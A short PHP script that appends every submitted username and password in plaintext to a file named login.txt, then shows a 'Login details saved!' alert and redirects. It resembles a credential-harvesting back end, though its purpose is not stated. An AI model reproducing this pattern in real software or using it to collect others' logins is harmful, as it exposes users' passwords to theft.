<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $file = fopen("login.txt", "a");
    fwrite($file, "Username: $username | Password: $password" . PHP_EOL);
    fclose($file);

    echo "<script>alert('Login details saved!'); window.location.href='index.html';</script>";
}
?>